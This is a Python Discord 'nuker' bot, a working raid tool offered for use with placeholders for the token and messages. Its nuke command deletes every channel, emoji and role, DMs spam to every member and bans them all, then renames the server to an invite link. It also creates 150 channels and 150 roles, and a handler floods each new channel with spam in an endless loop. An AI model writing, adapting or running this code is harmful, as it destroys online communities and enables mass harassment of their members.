import discord, asyncio, random
from discord.ext import commands

owners = ['CHANGE ME', 'CHANGE ME']
channels = ['CHANG ME', 'CHANGE ME']
spam = ['CHANGE ME', 'CHANGE ME']
token = 'CHANGE ME'

# Server Icon
with open('icon.png', 'rb') as f:
    icon = f.read()

# Server Banner
with open('banner.png', 'rb') as f:
    banner = f.read()

# Bot Variable
bot = commands.Bot(help_command=None, command_prefix='CHANGE ME', case_insensitive=True,
                   intents=discord.Intents.all())

# Events
@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name="!nuke", url="https://www.twitch.tv/dubrovskylive/video/1101665032"))
    print('Bot is online!')

# Nuker
@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            print(f"Couldn't delete {channel}")
            pass
    for user in list(ctx.guild.members):
        try:
            await user.send('CHANGE ME')
        except:
            print(f"Couldn't send message to {user.display_name}#{user.discriminator}")
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            print(f"Couldn't ban {user.display_name}#{user.discriminator}")
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            await asyncio.sleep(5)
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            print(f"Couldn't delete {role.name}")
            pass
    try:
        await ctx.guild.edit(
            name="https://discord.gg/FC6Uqh5smf",
            description="https://discord.gg/FC6Uqh5smf",
            reason="https://discord.gg/FC6Uqh5smf",
            icon=icon,
            banner=banner
        )  
    except:
          print(f"Couldn't change server banner of icon")
          pass
    for i in range(150):
        await ctx.guild.create_text_channel(name=random.choice(channels))
    for i in range(150):
        await ctx.guild.create_role(name="https://discord.gg/FC6Uqh5smf", color=0x2D6316)

@bot.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(spam))

bot.run(token)